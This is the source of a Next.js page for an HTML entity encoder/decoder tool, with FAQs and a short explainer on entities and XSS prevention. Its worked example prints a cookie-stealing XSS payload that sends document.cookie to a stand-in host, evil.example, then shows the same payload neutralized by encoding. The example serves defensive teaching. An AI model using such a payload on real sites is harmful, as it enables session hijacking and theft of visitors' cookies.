import type { Metadata } from 'next'
import AdBanner from '@/components/AdBanner'
import HtmlWrapper from '@/components/HtmlWrapper'
import FAQ, { type FaqItem } from '@/components/FAQ'
import Footer from '@/components/Footer'

export const metadata: Metadata = {
  title: 'HTML Encode / Decode — HTML Entity Converter',
  description:
    'Convert HTML special characters to entities and back. Free HTML encoder decoder supporting basic and extended HTML entities. Instant, no signup.',
  alternates: { canonical: 'https://encodedecode.app/html' },
}

const faqs: FaqItem[] = [
  {
    q: 'What are HTML entities?',
    a: 'HTML entities are special codes used to represent characters that have a reserved meaning in HTML, or characters that cannot be typed directly. For example, the < character would be interpreted as the start of an HTML tag, so it must be written as &lt; to appear as a literal less-than sign in a web page.',
  },
  {
    q: 'Why do I need to encode HTML characters?',
    a: 'HTML encoding is essential for security and correctness. If user-provided text is inserted into an HTML page without encoding, characters like <, >, and " can break the HTML structure or be exploited for cross-site scripting (XSS) attacks. Proper HTML encoding ensures text is displayed literally rather than interpreted as HTML.',
  },
  {
    q: 'What is the HTML entity for a space?',
    a: 'A regular space in HTML is just a space character. The HTML entity &nbsp; represents a non-breaking space — a space that prevents a line break from occurring at that point and ensures browsers do not collapse multiple spaces into one. Use &nbsp; when you need a space that will always render.',
  },
  {
    q: 'How do I decode HTML entities?',
    a: 'Switch to Decode mode and paste your HTML-encoded text. The tool converts HTML entities like &amp;, &lt;, &gt;, &quot;, &#039;, and named entities back to their original characters. Decoding is performed entirely in your browser — no data is sent to any server.',
  },
  {
    q: 'What is the difference between HTML encoding and URL encoding?',
    a: 'HTML encoding converts characters to HTML entities (e.g., & → &amp;) for safe insertion into HTML documents. URL encoding converts characters to percent-encoded sequences (e.g., & → %26) for safe inclusion in URLs. They serve different contexts: HTML encoding is for HTML content, URL encoding is for URL query strings and paths.',
  },
]

const faqSchema = {
  '@context': 'https://schema.org',
  '@type': 'FAQPage',
  mainEntity: faqs.map((f) => ({
    '@type': 'Question',
    name: f.q,
    acceptedAnswer: { '@type': 'Answer', text: f.a },
  })),
}

const webAppSchema = {
  '@context': 'https://schema.org',
  '@type': 'WebApplication',
  name: 'HTML Encode / Decode',
  url: 'https://encodedecode.app/html',
  applicationCategory: 'DeveloperApplication',
  operatingSystem: 'Any',
  offers: { '@type': 'Offer', price: '0', priceCurrency: 'USD' },
}

const howToSchema = {
  '@context': 'https://schema.org',
  '@type': 'HowTo',
  name: 'How to HTML Encode and Decode Online',
  step: [
    { '@type': 'HowToStep', name: 'Select mode', text: 'Choose Encode to convert HTML characters to entities, or Decode to convert entities back to characters.' },
    { '@type': 'HowToStep', name: 'Paste your HTML', text: 'Paste your text or HTML into the left panel.' },
    { '@type': 'HowToStep', name: 'Copy the result', text: 'The encoded or decoded output appears instantly. Click Copy to copy to clipboard.' },
  ],
}

export default function HtmlPage() {
  return (
    <>
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(faqSchema).replace(/</g, '\\u003c') }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(webAppSchema).replace(/</g, '\\u003c') }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(howToSchema).replace(/</g, '\\u003c') }} />

      <h1 className="sr-only">HTML Encode / Decode — HTML Entity Converter Online</h1>
      <HtmlWrapper />

      <section className="bg-white dark:bg-[#0f172a]">
        <div className="max-w-3xl mx-auto px-4 sm:px-6 pt-10 pb-4 space-y-10">
          <div>
            <h2 className="text-xl font-bold text-gray-900 dark:text-white mb-4">How HTML Entity Encoding Works</h2>
            <div className="space-y-3 text-sm text-gray-600 dark:text-gray-400 leading-relaxed">
              <p>HTML is a markup language where certain characters carry structural meaning. The angle brackets <code className="font-mono text-xs">&lt;</code> and <code className="font-mono text-xs">&gt;</code> delimit HTML tags. The ampersand <code className="font-mono text-xs">&amp;</code> begins entity references. Double quotes and single quotes delimit attribute values. When these characters appear in text content or attribute values, they must be replaced with their HTML entity equivalents so the browser displays them as literal characters rather than interpreting them as HTML syntax.</p>
              <p>The five essential HTML entities every developer must know: <code className="font-mono text-xs">&amp;amp;</code> for &amp;, <code className="font-mono text-xs">&amp;lt;</code> for &lt;, <code className="font-mono text-xs">&amp;gt;</code> for &gt;, <code className="font-mono text-xs">&amp;quot;</code> for &quot;, and <code className="font-mono text-xs">&amp;apos;</code> for &apos;. Beyond these five, HTML supports named entities for hundreds of additional characters — <code className="font-mono text-xs">&amp;copy;</code> for ©, <code className="font-mono text-xs">&amp;mdash;</code> for —, <code className="font-mono text-xs">&amp;nbsp;</code> for a non-breaking space — as well as numeric character references in decimal (<code className="font-mono text-xs">&amp;#169;</code>) or hexadecimal (<code className="font-mono text-xs">&amp;#xA9;</code>) form for any Unicode code point.</p>
              <p>HTML encoding is the primary defense against cross-site scripting (XSS) attacks. XSS is consistently ranked among the OWASP Top 10 most critical web security vulnerabilities. An XSS attack injects malicious scripts into a web page that then execute in other users&apos; browsers, potentially stealing session cookies, redirecting users, or defacing the page. Proper HTML encoding of all user-supplied content before rendering prevents this class of attack entirely.</p>
            </div>
          </div>
          <div>
            <h2 className="text-xl font-bold text-gray-900 dark:text-white mb-4">A Worked Example: Stopping an XSS Attack</h2>
            <div className="space-y-3 text-sm text-gray-600 dark:text-gray-400 leading-relaxed">
              <p>A developer builds a public comment system. A malicious user submits the comment: <code className="font-mono text-xs break-all">{`<script>document.location='https://evil.example/steal?c='+document.cookie</script>`}</code></p>
              <p>Without HTML encoding, this script tag gets embedded directly in the page HTML and executes in every visitor&apos;s browser, silently sending their session cookies to the attacker&apos;s server. The session hijacking attack succeeds without any visible indication to the victim.</p>
              <p>With proper HTML encoding applied before rendering, the comment becomes: <code className="font-mono text-xs break-all">&amp;lt;script&amp;gt;document.location=&apos;https://evil.example/steal?c=&apos;+document.cookie&amp;lt;/script&amp;gt;</code>. The browser displays this as visible text on the page — the characters &lt; and &gt; are visible to readers but the browser never interprets them as HTML. The XSS attack is completely neutralized. This is why every modern web framework and template engine applies HTML auto-escaping by default.</p>
            </div>
          </div>
          <div>
            <h2 className="text-xl font-bold text-gray-900 dark:text-white mb-4">Encoding Context, Named Entities, and Common Pitfalls</h2>
            <div className="space-y-3 text-sm text-gray-600 dark:text-gray-400 leading-relaxed">
              <p><strong>Encode on output, not on input.</strong> The correct practice is to store data in its original unencoded form and encode it for the specific rendering context at output time. Encoding on input and re-encoding on output leads to double-encoding — a user&apos;s ampersand becomes <code className="font-mono text-xs">&amp;amp;amp;</code> instead of <code className="font-mono text-xs">&amp;amp;</code>. Each rendering context (HTML body, HTML attribute, URL, JavaScript string, CSS) has its own escaping rules, and applying HTML encoding in the wrong context does not provide security.</p>
              <p><strong>Named vs numeric entities</strong>: named entities like <code className="font-mono text-xs">&amp;copy;</code> and <code className="font-mono text-xs">&amp;mdash;</code> are human-readable but require the HTML5 entity list for reference. Numeric entities like <code className="font-mono text-xs">&amp;#169;</code> work for any Unicode character without needing to know its name. Both are valid in HTML5. Numeric hex references (<code className="font-mono text-xs">&amp;#xA9;</code>) are particularly useful for characters that lack a named entity.</p>
              <p><strong>The non-breaking space</strong> <code className="font-mono text-xs">&amp;nbsp;</code> is frequently misused as a generic spacing tool. Its actual purpose is to prevent a line break between two words — useful for values like &ldquo;100 km&rdquo; or names that should never be split across lines. For layout spacing, CSS margin and padding are the correct tool. Overusing <code className="font-mono text-xs">&amp;nbsp;</code> creates accessibility issues for screen readers and makes content harder to maintain.</p>
            </div>
          </div>
        </div>
      </section>

      <section className="bg-white dark:bg-[#0f172a]">
        <div className="max-w-[1600px] mx-auto px-4 sm:px-6">
          <div className="pb-2">
            <AdBanner slot="5555555555" />
          </div>
          <div className="max-w-3xl mx-auto pb-8 pt-4">
            <div className="rounded-2xl bg-blue-50 dark:bg-blue-950/30 border border-blue-100 dark:border-blue-900/50 px-6 py-5">
              <h2 className="text-base font-bold text-blue-900 dark:text-blue-300 mb-2">html entity encoder decoder — instant conversion</h2>
              <p className="text-sm text-blue-800 dark:text-blue-400 leading-relaxed">
                This html encoder decoder converts special characters to HTML entities (&amp;amp;, &amp;lt;, &amp;gt;, &amp;quot;)
                and back. Choose from basic, extended, or numeric entity modes. Essential for preventing XSS and safely displaying
                user-generated content in HTML pages. All processing runs in your browser — no data is sent to any server.
              </p>
            </div>
          </div>
          <div className="max-w-3xl mx-auto pb-10">
            <FAQ questions={faqs} />
          </div>
          <div className="max-w-3xl mx-auto pb-6">
            <AdBanner slot="6666666666" />
          </div>
        </div>
      </section>

      <Footer />
    </>
  )
}
